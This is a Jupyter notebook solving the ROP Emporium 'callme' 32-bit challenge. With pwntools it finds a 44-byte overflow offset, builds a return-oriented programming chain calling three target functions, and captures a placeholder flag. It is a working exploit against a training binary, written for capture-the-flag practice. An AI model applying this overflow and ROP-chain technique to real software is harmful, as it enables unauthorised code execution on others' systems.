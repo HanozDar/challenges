{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "eccdba39",
   "metadata": {},
   "source": [
    "# Solution for callme x86 - ROP Emporium"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "6deab6c3",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pwn\n",
    "from pwn import *"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "949085e5",
   "metadata": {},
   "source": [
    "Let's see what type of file we're working with\n",
    "```text\n",
    "┌──(hanoz㉿kali)-[~/Desktop/ropemporium/callme/callme32]\n",
    "└─ file callme32                                                                                                                                                                                                                      130 ⨯\n",
    "callme32: ELF 32-bit LSB executable\n",
    "```\n",
    "Let's see the options on the binary\n",
    "```text\n",
    "gdb-peda checksec\n",
    "CANARY    : disabled\n",
    "FORTIFY   : disabled\n",
    "NX        : ENABLED\n",
    "PIE       : disabled\n",
    "RELRO     : Partial\n",
    "```\n",
    "Let's see what functions are on the binary\n",
    "```text\n",
    "0x08048686  main\n",
    "0x080486ed  pwnme\n",
    "0x0804874f  usefulFunction\n",
    "0x080484e0  callme_three@plt\n",
    "0x080484f0  callme_one@plt\n",
    "0x08048550  callme_two@plt\n",
    "```\n",
    "From the challenge we know that we have to call these 3 functions \n",
    "main calls callme\n",
    "We have to create a ROP chain so let's get started. \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "1cf1f21b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Starting local process './callme32'\n",
      "[+] Starting local process './callme32': pid 20006\n",
      "[*] Loading gadgets for '/home/hanoz/Desktop/ropemporium/callme/callme32/callme32'\n"
     ]
    }
   ],
   "source": [
    "p = process('./callme32')\n",
    "elf = ELF('./callme32',checksec=False)\n",
    "rop = ROP(elf)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "554102fe",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'callme by ROP Emporium\\nx86\\n\\nHope you read the instructions...\\n\\n> '\n"
     ]
    }
   ],
   "source": [
    "init_recvd = p.recv()\n",
    "print(init_recvd)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "01acc3a7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Process './callme32' stopped with exit code -11 (SIGSEGV) (pid 19916)\n",
      "[x] Parsing corefile...\n",
      "[*] '/home/hanoz/Desktop/ropemporium/callme/callme32/core.19916'\n",
      "    Arch:      i386-32-little\n",
      "    EIP:       0x6161616c\n",
      "    ESP:       0xffa25b80\n",
      "    Exe:       '/home/hanoz/Desktop/ropemporium/callme/callme32/callme32' (0x8048000)\n",
      "    Fault:     0x6161616c\n",
      "[+] Parsing corefile...: Done\n",
      "[+] We have found the offset at location 44\n"
     ]
    }
   ],
   "source": [
    "x = 50\n",
    "payload = cyclic(x,n=4) \n",
    "p.sendline(payload)\n",
    "\n",
    "p.wait()\n",
    "core = p.corefile\n",
    "\n",
    "offset = cyclic_find(core.fault_addr)\n",
    "log.success(\"We have found the offset at location \" + str(offset))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "a3b59cde",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x0000:        0x80484f0 callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)\n",
      "0x0004:        0x80484aa <adjust @0x14> add esp, 8; pop ebx; ret\n",
      "0x0008:       0xdeadbeef arg0\n",
      "0x000c:       0xcafebabe arg1\n",
      "0x0010:       0xd00df00d arg2\n",
      "0x0014:        0x8048550 callme_two(0xdeadbeef, 0xcafebabe, 0xd00df00d)\n",
      "0x0018:        0x80484aa <adjust @0x28> add esp, 8; pop ebx; ret\n",
      "0x001c:       0xdeadbeef arg0\n",
      "0x0020:       0xcafebabe arg1\n",
      "0x0024:       0xd00df00d arg2\n",
      "0x0028:        0x80484e0 callme_three(0xdeadbeef, 0xcafebabe, 0xd00df00d)\n",
      "0x002c:          b'laaa' <return address>\n",
      "0x0030:       0xdeadbeef arg0\n",
      "0x0034:       0xcafebabe arg1\n",
      "0x0038:       0xd00df00d arg2\n"
     ]
    }
   ],
   "source": [
    "args = [0xdeadbeef, 0xcafebabe, 0xd00df00d]\n",
    "rop.callme_one(*args)\n",
    "rop.callme_two(*args)\n",
    "rop.callme_three(*args)\n",
    "\n",
    "print(rop.dump())\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "a9cf0b9a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\xf0\\x84\\x04\\x08\\xaa\\x84\\x04\\x08\\xef\\xbe\\xad\\xde\\xbe\\xba\\xfe\\xca\\r\\xf0\\r\\xd0P\\x85\\x04\\x08\\xaa\\x84\\x04\\x08\\xef\\xbe\\xad\\xde\\xbe\\xba\\xfe\\xca\\r\\xf0\\r\\xd0\\xe0\\x84\\x04\\x08laaa\\xef\\xbe\\xad\\xde\\xbe\\xba\\xfe\\xca\\r\\xf0\\r\\xd0'\n"
     ]
    }
   ],
   "source": [
    "rop_chain = rop.chain()\n",
    "print(rop_chain)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "93bd54ad",
   "metadata": {},
   "outputs": [],
   "source": [
    "payload = b\"A\"*44\n",
    "p.sendline (payload + rop_chain)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "deb22fba",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Process './callme32' stopped with exit code 0 (pid 20006)\n",
      "b'Thank you!\\ncallme_one() called correctly\\ncallme_two() called correctly\\nROPE{a_placeholder_32byte_flag!}'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/tmp/ipykernel_19988/1118392199.py:1: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n",
      "  flag_line = p.recvuntil(\"}\")\n"
     ]
    }
   ],
   "source": [
    "flag_line = p.recvuntil(\"}\")\n",
    "print(flag_line)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "08289c98",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
